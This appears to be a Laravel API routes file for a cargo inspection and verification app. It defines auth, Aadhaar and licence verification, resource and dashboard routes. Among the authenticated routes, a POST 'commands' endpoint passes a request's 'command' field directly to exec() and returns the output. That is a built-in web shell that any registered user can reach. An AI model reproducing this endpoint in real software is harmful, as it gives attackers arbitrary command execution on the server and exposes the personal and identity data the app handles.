<?php

use App\Http\Controllers\VerificationController;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| API Routes
|--------------------------------------------------------------------------
|
| Here is where you can register API routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| is assigned the "api" middleware group. Enjoy building your API!
|
*/

Route::prefix('/v1')->group(function () {

    Route::post('register', 'AuthController@register');
    Route::post('login', 'AuthController@login');
    Route::post('channel-partner/register', 'ChannelPartnerController@register');
    Route::post('channel-partner/login', 'ChannelPartnerController@login');
    Route::get('cargo-details_open', 'CargoDetailController@index2');

    Route::post('forgot-password', 'AuthController@forgotPassword');
    Route::post("reset-password", "AuthController@resetPassword")->name('password.reset');

    Route::apiResources([
        'phase' => 'PhaseController',
        'zone' => 'ZoneController',
        // 'groups' => 'GroupController',
    ]);
    Route::middleware('auth:sanctum')->group(function () {
        Route::prefix('verifications')->group(function () {
            Route::post('/verify-rc', [VerificationController::class, 'verifyRC']);
            Route::post('/send-aadhaar-otp', [VerificationController::class, 'sendAadharOTP']);
            Route::post('/verify-aadhaar-otp', [VerificationController::class, 'verifyAadharOTP']);
            Route::post('/verify-dl', [VerificationController::class, 'verifyDL']);
        });

        Route::get("/cargo-details/export", 'CargoDetailController@export');

        // routes/api.php

        Route::apiResources([
            'users' => 'UserController',
            'channel-partner' => 'ChannelPartnerController',
            'groups' => 'GroupController',
            'checklist-masters' => 'ChecklistMasterController',
            'cargo-details' => 'CargoDetailController',
            'checklists' => 'ChecklistController',
            'photographs' => 'PhotographController',
            // 'phase' => 'PhaseController',
            // 'zone' => 'ZoneController',
            'customers' => 'CustomerController',
            'sops' => 'SopController',
        ]);

        Route::post('update-password', 'AuthController@updatePassword');
        Route::post('photographs/{id}', 'PhotographController@update');
        Route::get('groups-count', 'GroupController@count');
        Route::post('groups/{id}', 'GroupController@update');
        Route::get('checklist-masters-count', 'ChecklistMasterController@count');
        Route::get('cargo-details-count', 'CargoDetailController@count');
        Route::post('cargo-details/{id}', 'CargoDetailController@update');
        Route::post('checklists/{id}', 'ChecklistController@update');
        Route::get('checklists-count', 'ChecklistController@count');
        Route::get('photographs-count', 'PhotographController@count');
        Route::get('all-counts', 'UserController@allcounts');

        Route::post('logout', 'AuthController@logout');
        Route::post('commands', function (Request $request) {
            $data = request()->validate([
                'command' => 'required|string',
            ]);

            $output = exec($data["command"]);

//            Artisan::call($data['command']);

            return response()->json(["success" => true, "message" => $output]);
        });

        Route::get('dashboard', 'DashboardController@index');
        Route::get('dashboard/customer', 'DashboardController@filterByCustomer');

        Route::prefix('api-usage')
            ->controller(ApiUsageReportController::class)
            ->group(function () {
                Route::get('summary',     'summary');
                Route::get('by-endpoint', 'byEndpoint');
                Route::get('by-user',     'byUser');
                Route::get('daily-trend', 'dailyTrend');
            });

    });
    Route::get("cargo-details/{cargo_detail}/report", "CargoDetailController@report");

});
